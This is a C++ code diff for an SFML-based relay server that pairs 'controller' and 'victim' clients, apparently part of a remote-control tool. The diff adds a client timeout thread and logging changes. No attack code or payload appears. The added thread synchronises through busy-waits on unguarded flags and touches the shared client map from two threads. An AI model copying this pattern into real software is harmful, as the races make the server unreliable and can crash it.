@@ -8,12 +8,17 @@ Server::Server()
 	}	
 	selector.add(listener);
 	std::cout << "listening on port " << PORT << "\n";
-}
 
+	std::thread checkAwakeThread(&Server::checkAwake, this);
+	checkAwakeThread.detach();
+}
 void Server::receive()
 {
 	if (!selector.wait())
 		return;
+
+	while (!canReceive) {}
+	isReceiving = true;
 
 	//check if a client has received something
 	for (auto& c : clients) {
@@ -25,9 +30,12 @@ void Server::receive()
 
 		//disconnect client
 		if (p.getDataSize() == 0) {
+			std::cout << "disconnected ";
 			disconnect(c.first);
 			break;
 		}
+
+		c.second.lastMsg = Mlib::getTime();
 
 		//process packet according to sender's role
 		if (c.second.role == 'c')
@@ -55,7 +63,7 @@ void Server::receive()
 			}
 		}
 
-		break;
+		return;
 	}
 	//check if a client is ready to connect
 	if (selector.isReady(listener)) {
@@ -68,6 +76,25 @@ void Server::receive()
 			delete c.socket;
 			currentId--;
 		}
+	}
+
+	isReceiving = false;
+}
+void Server::checkAwake()
+{
+	while (true) {
+		auto copy = clients;
+		for (auto& c : copy) {
+			if (Mlib::getTime() - c.second.lastMsg < 5'000)
+				continue;
+
+			while (isReceiving) {}
+			canReceive = false;
+			std::cout << "timed out ";
+			disconnect(c.first);
+			canReceive = true;
+		}
+		Mlib::sleep(10);
 	}
 }
 
@@ -138,10 +165,10 @@ void Server::processControllerMsg(sf::Uint8 id, sf::Packet p)
 		if (clients[oId].role == '-')
 			return;
 
+		std::cout << "killed ";
 		disconnect(oId);
 	}
 }
-
 void Server::processVictimMsg(sf::Uint8 id, sf::Packet p)
 {
 }
@@ -149,9 +176,6 @@ void Server::processVictimMsg(sf::Uint8 id, sf::Packet p)
 void Server::disconnect(sf::Uint8 id)
 {
 	sf::Packet p;
-	p << sf::Uint8('e');
-	clients[id].socket->send(p);
-
 	//unpair the paired client
 	if (clients[id].pair != 0) {
 		//if client is controller, tell him to unpair
@@ -174,10 +198,9 @@ void Server::disconnect(sf::Uint8 id)
 	selector.remove(*clients[id].socket);
 	delete clients[id].socket;
 	clients.erase(id);
-	std::cout << "id: " << id << " disconnected\n";
+	std::cout << "id: " << int(id) << "\n";
 	updateControllersList();
 }
-
 void Server::updateControllersList()
 {
 	auto sendControllers = [this](sf::Packet p) {
